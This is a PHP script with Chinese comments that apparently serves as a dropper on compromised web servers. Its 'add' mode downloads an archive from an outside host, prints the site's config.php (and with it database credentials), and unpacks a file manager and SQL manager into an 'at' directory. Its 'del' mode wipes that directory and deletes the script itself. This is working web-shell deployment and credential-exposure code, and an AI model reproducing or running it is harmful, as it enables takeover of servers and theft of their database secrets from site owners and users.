<?php
$mod=$_GET['mod'];
echo "mod=add参数下载文件，mod=del参数清除文件<br>/at进入文管,/at/sql.php进入库管";
if($mod=='add'){ 
$she=file_get_contents("http/pp.q60.pw/at.zip");
if(file_exists("../config.php")){
$sq=file_get_contents("../config.php");
} else if(file_exists("./config.php")){
$sq=file_get_contents("./config.php");}
echo "config.php文件打印<br>".htmlspecialchars($sq);
if(strlen($she) == 0) echo "下载失败"&&exit;
file_put_contents("at.zip",$she) ;
echo "<br>下载完成";
function get_zip_originalsize($filename, $path) {
 //先判断待解压的文件是否存在
 if(!file_exists($filename)){
  die("文件 $filename 不存在！");
 } 
 $starttime = explode(' ',microtime()); //解压开始的时间

 //将文件名和路径转成windows系统默认的gb2312编码，否则将会读取不到
 $filename = iconv("utf-8","gb2312",$filename);
 $path = iconv("utf-8","gb2312",$path);
 //打开压缩包
 $resource = zip_open($filename);
 echo "<p>  打开压缩包， -> ".iconv("gb2312","utf-8",$filename)." </p>";
 $i = 1;
 //遍历读取压缩包里面的一个个文件
 while ($dir_resource = zip_read($resource)) {
  //如果能打开则继续
  if (zip_entry_open($resource,$dir_resource)) {
   //获取当前项目的名称,即压缩包里面当前对应的文件名
   $file_name = $path.zip_entry_name($dir_resource);
   //以最后一个“/”分割,再用字符串截取出路径部分
   $file_path = substr($file_name,0,strrpos($file_name, "/"));
   //如果路径不存在，则创建一个目录，true表示可以创建多级目录
   if(!is_dir($file_path)){
    mkdir($file_path,0777,true);
    echo "<p> ".$i++." 创建目录， -> ".iconv("gb2312","utf-8",$file_path)." </p>";
   }
   //如果不是目录，则写入文件
   if(!is_dir($file_name)){
    //读取这个文件
    $file_size = zip_entry_filesize($dir_resource);
    //最大读取6M，如果文件过大，跳过解压，继续下一个
    if($file_size<(1024*1024*6)){
     $file_content = zip_entry_read($dir_resource,$file_size);
     file_put_contents($file_name,$file_content);
     echo "<p> ".$i++." 写入文件， -> ".iconv("gb2312","utf-8",$file_name)." </p>";
    }else{
     echo "<p> ".$i++." 文件过大跳过， -> ".iconv("gb2312","utf-8",$file_name)." </p>";
    }
   }
   //关闭当前
   zip_entry_close($dir_resource);
  }
 }
 //关闭压缩包
 zip_close($resource); 
 unlink($filename);
 $endtime = explode(' ',microtime()); //解压结束的时间
 $thistime = $endtime[0]+$endtime[1]-($starttime[0]+$starttime[1]);
 $thistime = round($thistime,3); //保留3为小数
 echo "<p>解压完成花费：$thistime 秒，原文件已删除。</p>";
}
$size = get_zip_originalsize('at.zip','./at/');


}
if($mod=='del'){


function deldir($dir) {
  //先删除目录下的文件：
  $dh=opendir($dir);
  while ($file=readdir($dh)) {
    if($file!="." && $file!="..") {
      $fullpath=$dir."/".$file;
      if(!is_dir($fullpath)) {
          unlink($fullpath);
      } else {
          deldir($fullpath);
      }
    }
  }
 
  closedir($dh);
  //删除当前文件夹：
  if(rmdir($dir)) {
    return true;
  } else {
    return false;
  }
}

$del=deldir("at");
unlink("download.php");
if($del){
echo "删除成功";
}else{
echo "删除失败";
}

}
